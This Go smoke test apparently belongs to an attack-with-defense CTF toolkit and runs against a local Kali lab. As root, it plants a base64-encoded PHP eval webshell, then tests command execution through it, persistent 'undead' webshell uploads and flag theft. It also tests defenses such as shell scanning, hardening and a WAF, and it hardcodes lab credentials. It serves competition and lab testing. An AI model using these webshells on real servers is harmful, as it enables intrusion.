package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"awd-h1m-pro/internal/config"
	"awd-h1m-pro/internal/core/logic"
	"awd-h1m-pro/internal/pcapsearch"
	"awd-h1m-pro/internal/pcapserver"
	"awd-h1m-pro/internal/pcapstore"
	"awd-h1m-pro/internal/util"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcapgo"
)

type checkResult struct {
	Name    string `json:"name"`
	Success bool   `json:"success"`
	Detail  string `json:"detail"`
}

func main() {
	results := make([]checkResult, 0)
	must(util.EnsureDefaultOutputFiles())
	must(config.InitConfig())
	must(config.Update(func(cfg *config.Config) {
		cfg.Shell.Port = "18081"
		cfg.Shell.Pass = "pass"
		cfg.Shell.Path = "/"
		cfg.Shell.File = "shell.php"
		cfg.Shell.Method = "POST"
		cfg.Shell.Timeout = 5
		cfg.SSH.Host = "127.0.0.1"
		cfg.SSH.Port = "2222"
		cfg.SSH.Username = "root"
		cfg.SSH.Password = "Root123!awd"
		cfg.SSH.Path = "/home/kali/awd_lab/www"
		cfg.Database.Host = "127.0.0.1"
		cfg.Database.Port = "3306"
		cfg.Database.Username = "awduser"
		cfg.Database.Password = "awdpass123!"
		cfg.Database.Name = "awdtest"
		cfg.UndeadHorse.URLPass = "pass"
		cfg.UndeadHorse.Pass = "undeadpass"
		cfg.UndeadHorse.Filename = "favicon.php"
		cfg.WormShell.URLPass = "pass"
		cfg.WormShell.Pass = "wormpass"
	}))
	must(resetWSLLabState())
	must(util.WriteLinesAtomic(filepath.Join(util.OutputDir(), "target.txt"), []string{"127.0.0.1"}))

	attack := logic.NewAttackService()
	defense := logic.NewDefenseService(nil)
	flagSvc := logic.NewFlagService(attack)
	sshSvc := &logic.ServiceService{}
	ownTargets := "127.0.0.1"

	results = append(results, check("shell.exec", func() error {
		result, err := attack.ExecCommandViaShell("127.0.0.1", "printf SHELL_OK")
		if err != nil {
			return err
		}
		if !strings.Contains(result.Output, "SHELL_OK") {
			return fmt.Errorf("unexpected output: %q", result.Output)
		}
		return nil
	}))

	results = append(results, check("md5.upload+exec", func() error {
		if _, err := attack.UploadMd5Horse([]string{"127.0.0.1"}, "md5pass", "cmd"); err != nil {
			return err
		}
		must(config.Update(func(cfg *config.Config) {
			cfg.Shell.File = "index.php"
		}))
		defer must(config.Update(func(cfg *config.Config) {
			cfg.Shell.File = "shell.php"
		}))
		result, err := attack.ExecCommandViaMd5Horse("127.0.0.1", "pass", "md5pass", "cmd", "printf MD5_OK")
		if err != nil {
			return err
		}
		if !strings.Contains(result.Output, "MD5_OK") {
			return fmt.Errorf("unexpected output: %q", result.Output)
		}
		return nil
	}))

	results = append(results, check("undead.upload+exec", func() error {
		taskID := attack.UploadUndeadHorseAsync([]string{"127.0.0.1"}, "pass", "undeadpass", nil)
		if err := waitTaskDone(attack, taskID, 20*time.Second); err != nil {
			return err
		}
		must(config.Update(func(cfg *config.Config) {
			cfg.Shell.File = "index.php"
		}))
		defer must(config.Update(func(cfg *config.Config) {
			cfg.Shell.File = "shell.php"
		}))
		result, err := attack.ExecCommandViaUndeadHorse("127.0.0.1", "printf UNDEAD_OK")
		if err != nil {
			return err
		}
		if !strings.Contains(result.Output, "UNDEAD_OK") {
			return fmt.Errorf("unexpected output: %q", result.Output)
		}
		return nil
	}))

	results = append(results, check("flag.http", func() error {
		items, err := flagSvc.GetFlagsFromShellAndSave("/http_flag.txt")
		if err != nil {
			return err
		}
		if len(items) == 0 || !items[0].Success || !strings.Contains(items[0].Flag, "FLAG{HTTP_CHAIN_OK}") {
			return fmt.Errorf("unexpected result: %+v", items)
		}
		return nil
	}))

	results = append(results, check("flag.shell", func() error {
		items, err := flagSvc.GetFlagsFromShellAndSaveWithType("/flag", logic.ShellTypeNormal, "", "", "", "cat /flag")
		if err != nil {
			return err
		}
		if len(items) == 0 || !items[0].Success || !strings.Contains(items[0].Flag, "FLAG{ROOT_FLAG_OK}") {
			return fmt.Errorf("unexpected result: %+v", items)
		}
		return nil
	}))

	var webBackup string
	results = append(results, check("defense.backup_web", func() error {
		if err := restartWSLSSH(); err != nil {
			return err
		}
		items, err := defense.BackupWebRoot(ownTargets)
		if err != nil {
			return err
		}
		webBackup = firstExistingPath(items)
		if webBackup == "" {
			return fmt.Errorf("no valid backup path: %+v", items)
		}
		if _, err := os.Stat(webBackup); err != nil {
			return err
		}
		return nil
	}))

	results = append(results, check("defense.find_shells", func() error {
		if err := restartWSLSSH(); err != nil {
			return err
		}
		items, err := defense.FindShells(ownTargets)
		if err != nil {
			return err
		}
		if len(items) == 0 {
			return fmt.Errorf("no suspicious files found")
		}
		for _, item := range items {
			if strings.Contains(strings.ToLower(item.Reason), "handshake failed") {
				return fmt.Errorf("ssh failed instead of scanning: %+v", items)
			}
		}
		return nil
	}))

	results = append(results, check("defense.harden", func() error {
		if err := restartWSLSSH(); err != nil {
			return err
		}
		if err := ensureNoFailureStrings(defense.HardenWebRoot(ownTargets)); err != nil {
			return err
		}
		if err := ensureNoFailureStrings(defense.MakeUploadDirsReadOnly(ownTargets)); err != nil {
			return err
		}
		if err := ensureNoFailureStrings(defense.HardenPHPConfig(ownTargets)); err != nil {
			return err
		}
		if err := ensureNoFailureStrings(defense.DeploySimpleWAF(ownTargets)); err != nil {
			return err
		}
		return nil
	}))

	results = append(results, check("defense.restore_web", func() error {
		if webBackup == "" {
			return fmt.Errorf("missing backup path")
		}
		if err := breakWSLIndex(); err != nil {
			return err
		}
		if err := restartWSLSSH(); err != nil {
			return err
		}
		if err := ensureNoFailureStrings(defense.RestoreWebFromBackup(ownTargets, webBackup)); err != nil {
			return err
		}
		resp, err := http.Get("http://127.0.0.1:18081/index.php")
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		if !strings.Contains(string(body), "index-ok") {
			return fmt.Errorf("unexpected body: %q", string(body))
		}
		return nil
	}))

	results = append(results, check("ssh.change_password", func() error {
		if err := restartWSLSSH(); err != nil {
			return err
		}
		resp, err := sshSvc.ChangeSSHPasswords(logic.SSHPasswordChangeParams{
			TargetsInput:   "127.0.0.1",
			Username:       "root",
			Port:           "2222",
			OldPasswords:   []string{"Root123!awd"},
			NewPassword:    "Root456!awd",
			MaxConcurrency: 1,
		})
		if err != nil {
			return err
		}
		if resp.Success != 1 {
			return fmt.Errorf("unexpected response: %+v", resp)
		}
		_, err = sshSvc.ChangeSSHPasswords(logic.SSHPasswordChangeParams{
			TargetsInput:   "127.0.0.1",
			Username:       "root",
			Port:           "2222",
			OldPasswords:   []string{"Root456!awd"},
			NewPassword:    "Root123!awd",
			MaxConcurrency: 1,
		})
		return err
	}))

	results = append(results, check("pcap.upload_search", func() error {
		sqlitePath := util.JoinExePath("pcap-smoke.sqlite")
		indexPath := util.JoinExePath("bleve-smoke")
		uploadDir := util.JoinExePath("pcap-smoke")
		_ = os.Remove(sqlitePath)
		_ = os.RemoveAll(indexPath)
		_ = os.RemoveAll(uploadDir)
		if err := pcapstore.Init(sqlitePath); err != nil {
			return err
		}
		pcapstore.StartProcessor()
		if err := pcapsearch.Init(indexPath); err != nil {
			return err
		}
		if err := pcapserver.Start(":19080", uploadDir); err != nil {
			return err
		}
		pcapPath, err := createSamplePCAP(util.JoinExePath("sample-smoke.pcap"))
		if err != nil {
			return err
		}
		if err := uploadPCAP("http://127.0.0.1:19080/upload", pcapPath, "lab1"); err != nil {
			return err
		}
		var hits []pcapsearch.SearchResult
		deadline := time.Now().Add(10 * time.Second)
		for time.Now().Before(deadline) {
			hits, err = pcapsearch.Search("login", 1, 10)
			if err == nil && len(hits) > 0 {
				break
			}
			time.Sleep(300 * time.Millisecond)
		}
		if len(hits) == 0 {
			return fmt.Errorf("no pcap hits found")
		}
		if _, err := pcapstore.GetPcapDetail(hits[0].PcapID); err != nil {
			return err
		}
		return nil
	}))

	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	_ = enc.Encode(results)

	failed := false
	for _, result := range results {
		if !result.Success {
			failed = true
			break
		}
	}
	if failed {
		os.Exit(1)
	}
}

func check(name string, fn func() error) checkResult {
	fmt.Fprintf(os.Stderr, "[smoke] start %s\n", name)
	if err := fn(); err != nil {
		fmt.Fprintf(os.Stderr, "[smoke] fail  %s: %v\n", name, err)
		return checkResult{Name: name, Success: false, Detail: err.Error()}
	}
	fmt.Fprintf(os.Stderr, "[smoke] pass  %s\n", name)
	return checkResult{Name: name, Success: true, Detail: "ok"}
}

func must(err error) {
	if err != nil {
		panic(err)
	}
}

func waitTaskDone(svc *logic.AttackService, taskID string, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		state := svc.GetTaskStatus(taskID)
		if state != nil && state.Status == "done" {
			return nil
		}
		time.Sleep(200 * time.Millisecond)
	}
	return fmt.Errorf("task %s timeout", taskID)
}

func createSamplePCAP(path string) (string, error) {
	file, err := os.Create(path)
	if err != nil {
		return "", err
	}
	defer file.Close()

	writer := pcapgo.NewWriter(file)
	if err := writer.WriteFileHeader(65536, layers.LinkTypeEthernet); err != nil {
		return "", err
	}

	packets := []struct {
		srcIP   string
		dstIP   string
		srcPort layers.TCPPort
		dstPort layers.TCPPort
		payload string
	}{
		{"10.10.10.2", "10.10.10.3", 43210, 80, "POST /login HTTP/1.1\r\nHost: test\r\n\r\nuser=admin&pass=123456"},
		{"10.10.10.3", "10.10.10.2", 80, 43210, "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nlogin ok"},
	}

	for _, item := range packets {
		eth := &layers.Ethernet{
			SrcMAC:       []byte{0, 1, 2, 3, 4, 5},
			DstMAC:       []byte{6, 7, 8, 9, 10, 11},
			EthernetType: layers.EthernetTypeIPv4,
		}
		ip := &layers.IPv4{
			Version:  4,
			IHL:      5,
			TTL:      64,
			SrcIP:    []byte{10, 10, 10, 2},
			DstIP:    []byte{10, 10, 10, 3},
			Protocol: layers.IPProtocolTCP,
		}
		if item.srcIP == "10.10.10.3" {
			ip.SrcIP = []byte{10, 10, 10, 3}
			ip.DstIP = []byte{10, 10, 10, 2}
		}
		tcp := &layers.TCP{
			SrcPort: item.srcPort,
			DstPort: item.dstPort,
			Seq:     1105024978,
			ACK:     true,
			PSH:     true,
			Window:  14600,
		}
		if err := tcp.SetNetworkLayerForChecksum(ip); err != nil {
			return "", err
		}
		buf := gopacket.NewSerializeBuffer()
		if err := gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}, eth, ip, tcp, gopacket.Payload(item.payload)); err != nil {
			return "", err
		}
		if err := writer.WritePacket(gopacket.CaptureInfo{Timestamp: time.Now(), CaptureLength: len(buf.Bytes()), Length: len(buf.Bytes())}, buf.Bytes()); err != nil {
			return "", err
		}
	}
	return path, nil
}

func uploadPCAP(endpoint, filePath, clientID string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	_ = writer.WriteField("client_id", clientID)
	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return err
	}
	if _, err := io.Copy(part, file); err != nil {
		return err
	}
	if err := writer.Close(); err != nil {
		return err
	}

	req, err := http.NewRequest(http.MethodPost, endpoint, &body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		data, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("upload failed: %s %s", resp.Status, strings.TrimSpace(string(data)))
	}
	return nil
}

func resetWSLLabState() error {
	script := `set -e
printf 'root:Root123!awd\nkali:Kali123!awd\n' | chpasswd
mkdir -p /home/kali/awd_lab/www/uploads
rm -f /home/kali/awd_lab/www/favicon.php '/home/kali/awd_lab/www/\favicon.php' /home/kali/awd_lab/www/.template.php /home/kali/awd_lab/www/waf.php /home/kali/awd_lab/www/.user.ini
printf '%s' 'PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOyA/Pg==' | base64 -d > /home/kali/awd_lab/www/shell.php
printf '%s' 'PD9waHAgZWNobyAiaW5kZXgtb2siOyA/Pg==' | base64 -d > /home/kali/awd_lab/www/index.php
printf '%s' 'PD9waHAgZWNobyAiaW5mby1vayI7ID8+' | base64 -d > /home/kali/awd_lab/www/info.php
printf '%s' 'FLAG{HTTP_CHAIN_OK}' > /home/kali/awd_lab/www/http_flag.txt
printf '%s' 'FLAG{SHELL_CHAIN_OK}' > /home/kali/awd_lab/ssh_flag.txt
printf '%s' 'FLAG{ROOT_FLAG_OK}' > /flag
chown -R kali:kali /home/kali/awd_lab
chown -R www-data:www-data /home/kali/awd_lab/www
chmod 755 /home/kali /home/kali/awd_lab /home/kali/awd_lab/www
chmod 755 /home/kali/awd_lab/www
chmod 644 /home/kali/awd_lab/www/index.php /home/kali/awd_lab/www/info.php /home/kali/awd_lab/www/http_flag.txt
chmod 666 /flag
if ! grep -q '^Listen 18081$' /etc/apache2/ports.conf; then
  printf '\nListen 18081\n' >> /etc/apache2/ports.conf
fi
cat > /etc/apache2/sites-available/awd-lab.conf <<'EOF'
<VirtualHost *:18081>
    ServerName awd-lab.local
    DocumentRoot /home/kali/awd_lab/www
    <Directory /home/kali/awd_lab/www>
        AllowOverride All
        Require all granted
        Options Indexes FollowSymLinks
        DirectoryIndex index.php index.html
    </Directory>
</VirtualHost>
EOF
a2ensite awd-lab.conf >/dev/null
service ssh restart >/dev/null
systemctl reset-failed apache2 >/dev/null 2>&1 || true
pgrep -u kali -f '^php -S 0.0.0.0:18081 -t /home/kali/awd_lab/www$' | xargs -r kill
sleep 1
service apache2 restart >/dev/null
`
	if output, err := runWSLRoot(script); err != nil {
		return fmt.Errorf("%w: %s", err, strings.TrimSpace(output))
	}
	httpClient := &http.Client{Timeout: 2 * time.Second}
	deadline := time.Now().Add(10 * time.Second)
	lastDetail := "no response"
	for time.Now().Before(deadline) {
		resp, err := httpClient.Get("http://127.0.0.1:18081/index.php")
		if err == nil {
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			if strings.Contains(string(body), "index-ok") {
				return nil
			}
			lastDetail = fmt.Sprintf("status=%d body=%q", resp.StatusCode, string(body))
		} else {
			lastDetail = err.Error()
		}
		time.Sleep(300 * time.Millisecond)
	}
	return fmt.Errorf("php lab server did not become ready on http://127.0.0.1:18081/index.php: %s", lastDetail)
}

func restartWSLSSH() error {
	cmd := exec.Command("wsl.exe", "-d", "kali-linux", "-u", "root", "--", "bash", "-lc", "systemctl reset-failed ssh >/dev/null 2>&1 || true; service ssh start >/dev/null 2>&1 || systemctl start ssh >/dev/null 2>&1; ss -ltn | grep -q ':2222'")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("%w: %s", err, strings.TrimSpace(string(output)))
	}
	time.Sleep(500 * time.Millisecond)
	return nil
}

func breakWSLIndex() error {
	script := `cat > /home/kali/awd_lab/www/index.php <<'PHP'
<?php echo "broken\n"; ?>
PHP
chown www-data:www-data /home/kali/awd_lab/www/index.php
chmod 644 /home/kali/awd_lab/www/index.php`
	output, err := runWSLRoot(script)
	if err != nil {
		return fmt.Errorf("%w: %s", err, strings.TrimSpace(output))
	}
	return nil
}

func runWSLRoot(script string) (string, error) {
	cmd := exec.Command("wsl.exe", "-d", "kali-linux", "-u", "root", "--", "bash", "-lc", script)
	output, err := cmd.CombinedOutput()
	return string(output), err
}

func firstExistingPath(items []string) string {
	for _, item := range items {
		if _, err := os.Stat(item); err == nil {
			return item
		}
	}
	return ""
}

func ensureNoFailureStrings(items []string, err error) error {
	if err != nil {
		return err
	}
	for _, item := range items {
		lower := strings.ToLower(item)
		if strings.Contains(lower, "failed:") || strings.Contains(lower, "connect failed") {
			return errors.New(item)
		}
	}
	return nil
}
